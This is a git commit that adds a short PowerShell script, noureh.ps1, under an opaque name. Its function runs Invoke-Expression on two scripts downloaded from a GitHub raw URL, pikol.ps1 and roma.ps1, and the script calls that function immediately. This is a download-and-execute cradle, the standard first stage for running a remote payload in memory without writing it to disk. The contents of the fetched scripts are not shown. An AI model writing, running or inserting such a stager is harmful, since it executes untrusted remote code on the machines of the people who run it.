ea711c1d28586062dfc02c29ef18756355e431fa
W1kyri3 <81154240+W1kyri3@users.noreply.github.com>
2021-04-08 16:11:02 +0100

    Create noureh.ps1

---
+++ noureh.ps1
@@ -0,0 +1,7 @@
+function noureh
+{
+      iex(new-object net.webclient).downloadString('https://raw.githubusercontent.com/W1kyri3/lunai/main/pikol.ps1')
+
+      iex(new-object net.webclient).downloadString('https://raw.githubusercontent.com/W1kyri3/lunai/main/roma.ps1')
+}
+noureh
